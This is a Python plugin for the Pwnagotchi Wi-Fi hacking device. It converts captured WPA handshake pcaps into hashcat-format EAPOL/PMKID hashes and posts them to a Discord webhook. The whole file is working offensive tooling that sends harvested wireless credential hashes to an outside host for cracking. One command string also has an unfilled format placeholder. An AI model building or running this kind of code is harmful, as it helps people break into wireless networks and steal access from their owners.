import logging
import requests
import subprocess
import json
import os
import pwnagotchi
import pwnagotchi.plugins as plugins


class DiscoHash(plugins.Plugin):
    __author__ = 'shain.lakin@protonmail.com aka v0yager'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = 'Posts hashes to discord.'

    def __init__(self):
        logging.debug("[*] DiscoHash plugin created")
    
    # called when the plugin is loaded
    def on_loaded(self):
        logging.warning(f"[*] DiscoHash plugin loaded")
    
    # called when an epoch is over (where an epoch is a single loop of the main algorithm)
    def on_epoch(self, agent, epoch, epoch_data):
        global fingerprint
        fingerprint = agent.fingerprint()
        handshake_dir = "/root/handshakes/"
        self.process_pcaps(handshake_dir)

    def process_pcaps(self, handshake_dir):
        handshakes_list = [os.path.join(handshake_dir, filename) for filename in os.listdir(handshake_dir) if filename.endswith('.pcap')]
        failed_jobs = []
        successful_jobs = []
        lonely_pcaps = []
        for num, handshake in enumerate(handshakes_list):
            fullpathNoExt = handshake.split('.')[0]
            pcapFileName = handshake.split('/')[-1:][0]
            if not os.path.isfile(fullpathNoExt + '.22000'): #if no 22000
                if self.write_hash(handshake):
                    successful_jobs.append('22000: ' + pcapFileName)
                else:
                    failed_jobs.append('22000: ' + pcapFileName)
                    
                    if not os.path.isfile(fullpathNoExt + '.22000'): #if no 22000
                        lonely_pcaps.append(handshake)
                        logging.debug('[* DiscoHash *] Batch job: added {} to lonely list'.format(pcapFileName))
            if ((num + 1) % 10 == 0) or (num + 1 == len(handshakes_list)): #report progress every 10, or when done
                logging.info('[* DiscoHash *] Batch job: {}/{} done ({} fails)'.format(num + 1,len(handshakes_list),len(lonely_pcaps)))
        if successful_jobs:
            logging.info('[* DiscoHash *] Batch job: {} new handshake files created'.format(len(successful_jobs)))
        if lonely_pcaps:
            logging.info('[* DiscoHash *] Batch job: {} networks without enough packets to create a hash'.format(len(lonely_pcaps)))
    
    def write_hash(self, fullpath):
        fullpathNoExt = fullpath.split('.')[0]
        filename = fullpath.split('/')[-1:][0].split('.')[0]
        result = subprocess.getoutput('hcxpcapngtool -o {}.22000 {} >/dev/null 2>&1'.format(fullpathNoExt,fullpath))
        analysis = subprocess.getoutput('hcxhashtool -i {}.22000 --info=stdout')
        if os.path.isfile(fullpathNoExt +  '.22000'):
            logging.info('[* DiscoHash *] [+] EAPOL/PMKID Success: {}.22000 created'.format(filename))
            
            try:
                hash_val = open(f'{fullpathNoExt}.22000', 'r')
                hash_data = hash_val.read()

            except Exception as e:
                logging.info(f'[! DiscoHash !]: An error occured {e}')
            
            try:
                data = {
                    'embeds': [
                        {
                        'title': 'WireTap hash update!',
                        'color': 3553599,
                        'description': 'New hash available:',
                        'url': 'https://pwnagotchi.ai/pwnfile/#!{}'.format(fingerprint),
                        'fields': [
                            {
                                'name': '{}'.format(filename),
                                'value': '`{}`'.format(hash_data),
                                'inline': True
                            },
                            {
                                'name': 'Hash Analysis:',
                                'value': '`{}`'.format(analysis),
                                'inline': True
                            }
                        ],
                        'footer': {
                            'text': 'Pwnagotchi v1.5.5 - DiscoHash Plugin v{}'.format(self.__version__)
                        }
                        }
                    ]
                }
                requests.post(self.options['webhook_url'], files={'payload_json': (None, json.dumps(data))})
                logging.info('[* DiscoHash *]: Webhook sent!')
            except Exception as e:
                logging.info('[! DiscoHash !]: An error occured with the plugin!')
            return True
        else:
            return False
